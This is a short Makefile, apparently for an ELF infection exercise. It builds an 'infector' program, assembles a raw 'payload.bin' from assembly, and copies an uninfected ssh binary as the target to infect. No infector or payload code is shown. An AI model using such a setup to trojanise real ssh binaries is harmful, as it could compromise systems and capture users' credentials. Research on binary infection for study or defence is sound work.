CC=gcc

all: infector payload.bin ssh

infector: infector.c
	$(CC) -fPIE -pie -o $@ $^

payload.o: payload.S
	$(CC) -c -o $@ $^ 

payload.bin: payload.o
	objcopy -O binary $^ $@
	rm -f ./payload.o

ssh: ssh_uninfected
	cp ./ssh_uninfected ./ssh

clean:
	rm -f ./payload.o
	rm -f ./payload.bin
	rm -f ./infector
	rm -f ./ssh
